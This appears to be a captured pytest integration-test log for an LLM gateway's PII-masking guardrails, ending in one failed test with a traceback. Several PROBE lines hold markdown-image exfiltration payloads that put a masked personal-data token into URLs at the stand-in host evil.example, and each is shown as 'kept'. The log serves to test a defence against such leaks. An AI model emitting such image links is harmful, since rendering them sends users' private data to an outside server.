@@ -1,0 +1,146 @@
+2026-11-03 15:14:02,245 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:14:02,459 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=1050
+2026-11-03 15:14:08,419 INFO ffcore.access access method=POST path=/api/v1/projects/c089edad-2bf7-4311-ab2a-b1640724d0d5/api-keys status=201 ms=5455
+2026-11-03 15:14:12,262 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:14:20,278 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=11040
+PROBE facade history: stale <<PII_1>> in the run's scope reads None
+.2026-11-03 15:14:50,699 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:14:52,527 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 15:14:52,874 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:14:53,519 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:14:53,578 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=690
+2026-11-03 15:14:53,800 INFO ffcore.access access method=POST path=/api/v1/projects/9563fc64-ef58-4d0d-96ee-7f6d38c9fcf4/api-keys status=201 ms=211
+2026-11-03 15:14:54,225 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:14:54,666 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:14:55,903 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:14:55,904 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:14:57,754 INFO ffcore.guardrails.masking detokenize_skipped_url scope=facade-7e9144af3bb54ca880af906be7e4f03b count=1
+2026-11-03 15:14:57,766 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=3530
+PROBE direct md image: kept -> 'hello ![x](https://evil.example/p?q=<<PII_1>>)'
+.2026-11-03 15:15:03,156 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 15:15:04,073 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:15:05,074 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:15:05,186 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=1103
+2026-11-03 15:15:05,589 INFO ffcore.access access method=POST path=/api/v1/projects/2a28825c-bb83-435a-b911-9b6d67481a2d/api-keys status=201 ms=391
+2026-11-03 15:15:06,359 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:15:07,023 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:15:08,066 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:15:08,069 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:15:08,433 INFO ffcore.guardrails.masking detokenize_skipped_url scope=facade-6d38bcaee371491b96c0408b3fcea8d3 count=1
+2026-11-03 15:15:08,442 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=2060
+PROBE direct md image space //: kept -> 'hello ![x]( //evil.example/p?q=<<PII_1>>)'
+.2026-11-03 15:15:10,991 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 15:15:11,641 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:15:12,878 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=1232
+2026-11-03 15:15:12,917 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:15:13,361 INFO ffcore.access access method=POST path=/api/v1/projects/e58c40d8-1383-4dc3-8253-365a6997928a/api-keys status=201 ms=437
+2026-11-03 15:15:13,856 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:15:14,312 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:15:15,236 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:15:15,237 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:15:15,712 INFO ffcore.guardrails.masking detokenize_skipped_url scope=facade-4e01499bcd72498eacddb82785013524 count=1
+2026-11-03 15:15:15,722 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=1846
+PROBE direct md ref def //: kept -> 'hello ![x][1]\n\n[1]: //evil.example/p?q=<<PII_1>>'
+.2026-11-03 15:15:18,379 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+2026-11-03 15:15:18,651 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:15:19,171 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:15:19,231 INFO ffcore.access access method=POST path=/api/v1/auth/login status=200 ms=567
+2026-11-03 15:15:19,521 INFO ffcore.access access method=POST path=/api/v1/projects/4925500b-ea0e-467c-b05e-40b7f1fe57e7/api-keys status=201 ms=274
+2026-11-03 15:15:20,095 ERROR ffcore.readiness warmup failed: ModelMissing
+2026-11-03 15:15:20,438 INFO ffcore.litellm_reconcile litellm_reconciled created=0 updated=0 deleted=0 problems=0
+2026-11-03 15:15:21,118 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:15:21,120 WARNING langfuse Context error: No active span in current context. Operations that depend on an active span will be skipped. Ensure spans are created with start_as_current_observation() or that you're operating within an active span context.
+2026-11-03 15:15:21,366 INFO ffcore.guardrails.masking detokenize_skipped_url scope=facade-1c1de9eb17fa4e40b85bfd689d624fab count=1
+2026-11-03 15:15:21,374 INFO ffcore.access access method=POST path=/v1/chat/completions status=200 ms=1263
+PROBE direct md angle dest space: kept -> 'hello ![x](<https://evil.example/a b?q= <<PII_1>>>)'
+.2026-11-03 15:15:22,965 INFO ffcore.litellm_reconcile litellm_reconciled created=1 updated=0 deleted=0 problems=0
+F
+=================================== FAILURES ===================================
+____________________ test_zz_r3_min_confidence_history_e2e _____________________
+
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_393ca8382978'
+catalog = <tests.integration.litellm_support.catalog.<locals>.Catalog object at 0x7f456e3abb00>
+llm_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+harness = <tests.integration.runtime_support.Harness object at 0x7f45785164b0>
+pg = <psycopg.Connection [IDLE] (host=postgres user=ffcore database=ffcore_test_393ca8382978) at 0x7f456e3a9fd0>
+monkeypatch = <_pytest.monkeypatch.MonkeyPatch object at 0x7f4572560950>
+
+    def test_zz_r3_min_confidence_history_e2e(database_url, catalog, llm_settings, harness, pg, monkeypatch):
+        project_id = catalog.project()
+        provider = catalog.provider([project_id])
+        catalog.model(project_id, provider, key="chat-default", model_id="ok-primary")
+        run_reconcile(database_url, llm_settings)
+        doc = definition(knowledge=[])
+        run_a = seed_run(pg, project_id, doc, status="completed")
+        run_b = seed_run(pg, project_id, doc, question=QUESTION_B)
+        conversation_id = _conversation(pg, project_id, run_a, run_b)
+        _message(pg, conversation_id, run_a, "user", "Telefonu ne?", 0)
+        _message(pg, conversation_id, run_a, "assistant", ANSWER_A, 1)
+        _message(pg, conversation_id, run_b, "user", QUESTION_B, 2)
+    
+        real = adapters.resolve_policy
+    
+        async def strict(session, pid, key):
+            policy = await real(session, pid, key)
+            pii = {k: v.model_copy(update={"min_confidence": 0.8}) for k, v in policy.pii_policies.items()}
+            return type(policy)(key=policy.key, spec=policy.spec, pii_policies=pii, builtin=policy.builtin)
+    
+        monkeypatch.setattr(adapters, "resolve_policy", strict)
+        before = len(fake_requests())
+    
+        async def go():
+            client = aioredis.from_url(os.environ["REDIS_URL"])
+            try:
+                store = RedisTokenStore(client, 60)
+                await store.token_for(str(run_a), "TR_PHONE:" + PHONE, PHONE)
+                await client.expire("ffcore:pii:" + str(run_a), 50)
+                await mark_listening(client, run_b, 600)
+                slots = LlmSlots(client, SlotSettings(slots=1), ALWAYS, prefix=f"r3:{uuid.uuid4().hex}")
+                factory = adapters.context_factory(
+                    llm_settings, client, slots, None, job_class=JobClass.interactive
+                )
+                attempt = Attempt(harness.settings, client, harness.db.session_scope, factory)
+                status = await execute(attempt, str(run_b), None)
+                ttl_a = await client.ttl("ffcore:pii:" + str(run_a))
+                b = {t: await store.lookup(str(run_b), t) for t in ("<<PII_7>>", "<<PII_9>>", "<<PII_10>>")}
+                return status, ttl_a, b
+            finally:
+                await client.aclose()
+    
+>       status, ttl_a, b = asyncio.run(go())
+                           ^^^^^^^^^^^^^^^^^
+
+tests/integration/test_zz_review_08t1a_r3.py:88: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/usr/local/lib/python3.12/asyncio/runners.py:195: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/asyncio/base_events.py:691: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+tests/integration/test_zz_review_08t1a_r3.py:81: in go
+    status = await execute(attempt, str(run_b), None)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+attempt = Attempt(settings=Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('...function session_scope at 0x7f4621f09260>, context_factory=<function context_factory.<locals>.build at 0x7f456e394e00>)
+run_id = '40337f71-7d79-43cd-b79e-9bd1d06c83a7', resume = None
+
+    async def execute(attempt: Attempt, run_id: str, resume: dict[str, Any] | None = None) -> str:
+        """Returns the run's status after this attempt."""
+        settings = attempt.settings
+        async with attempt.session_factory() as session:
+            run = await session.get(Run, uuid.UUID(run_id))
+            if run is None:
+>               raise LookupError(f"run {run_id} not found")
+E               LookupError: run 40337f71-7d79-43cd-b79e-9bd1d06c83a7 not found
+
+ffcore/runtime/runner.py:146: LookupError
+------------------------------ Captured log call -------------------------------
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=1 updated=0 deleted=0 problems=0
+=========================== short test summary info ============================
+FAILED tests/integration/test_zz_review_08t1a_r3.py::test_zz_r3_min_confidence_history_e2e
+1 failed, 5 passed in 157.36s (0:02:37)
